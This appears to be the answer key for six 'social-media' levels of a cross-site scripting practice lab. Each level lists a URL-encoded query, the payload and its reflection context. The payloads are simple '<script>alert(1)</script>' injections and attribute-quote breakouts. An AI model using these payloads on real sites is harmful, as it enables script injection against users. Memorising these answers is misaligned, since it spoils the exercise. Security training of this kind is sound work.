# social-media — solutions

Social-feed style reflections (tweet text, mention, hashtag href, bio, comment, share link). Mostly raw HTML body or attribute injections.

### social-media-level1

`/social-media/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: tweet text paragraph, raw reflection

### social-media-level2

`/social-media/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: mention link text, raw reflection

### social-media-level3

`/social-media/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: hashtag href + text dual reflection; href quote breakout

### social-media-level4

`/social-media/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: bio paragraph, raw reflection

### social-media-level5

`/social-media/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: reply text span, raw reflection

### social-media-level6

`/social-media/level6/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: share-button href; attribute breakout
